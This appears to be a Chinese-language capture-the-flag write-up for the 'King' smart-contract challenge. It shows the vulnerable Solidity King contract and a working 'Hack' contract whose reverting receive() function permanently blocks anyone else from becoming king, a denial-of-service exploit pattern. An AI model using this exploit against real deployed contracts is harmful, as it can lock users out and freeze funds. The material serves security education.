# King
## 題目
<img width="601" alt="截圖 2024-09-06 下午7 04 16" src="https://github.com/user-attachments/assets/73cb90d2-c8e9-4cd6-9c89-5cf0fb143c68">

### 目標
我們的目標是：
1. **成為 King**：透過向 King 合約發送比目前的 `prize` 更高的 Ether，成為 King。
2. **阻止其他人**：當其他玩家嘗試成為 King 時，利用合約中的漏洞，使他們的交易失敗，無法奪回 King 的位置。

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

在這個合約中，成為 King 的條件是向合約發送比目前 `prize` 更高的 Ether。當新的玩家支付足夠的金額時，King 合約會更新 `king` 為新的玩家地址，並將 `msg.value` 轉移給前一位 King。然而，當前的 King 是一個可以拒絕接收 Ether 的合約，從而導致 King 合約無法順利執行轉帳，交易失敗，合約進入 revert 狀態。

## Hack

1. **部署一個攻擊合約**：這個合約將發送 Ether 成為新的 King。
2. **阻止轉帳**：當 King 合約嘗試將新的 `prize` 轉給我們的攻擊合約時，攻擊合約會拒絕接收 Ether，導致轉帳失敗，從而阻止其他玩家成為新的 King。

### code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

contract Hack {
    constructor(address payable _target) payable {
        uint256 prize = IKing(_target).prize();
        
        // 向 King 合約發送 Ether 並成為新的 King
        (bool ok,) = _target.call{value: prize}("");
        require(ok, "tx failed");
    }

    // receive 函數，當收到來自 King 合約的 Ether 時直接中止
    receive() external payable {
        revert("I will not accept any funds");
    }
}
```

1. **構造函數**：在 `constructor` 中，合約首先查詢 King 合約的 `prize`，並發送等量的 Ether 來成為 King。
2. **`receive()` 函數**：該函數會阻止 King 合約向我們轉帳 Ether，這是攻擊的關鍵。當 King 合約嘗試給我們發送 Ether 時，交易會失敗，從而阻止合約繼續執行。

### 攻擊步驟

1. **部署攻擊合約**：當攻擊合約 `Hack` 被部署時，會發送 Ether 給 King 合約，並成為新的 King。
2. **阻止其他玩家成為 King**：King 合約嘗試向我們的攻擊合約轉帳時，因為我們的 `receive()` 函數會拒絕交易，導致 King 合約的交易失敗，從而阻止其他玩家奪取 King 的位置。
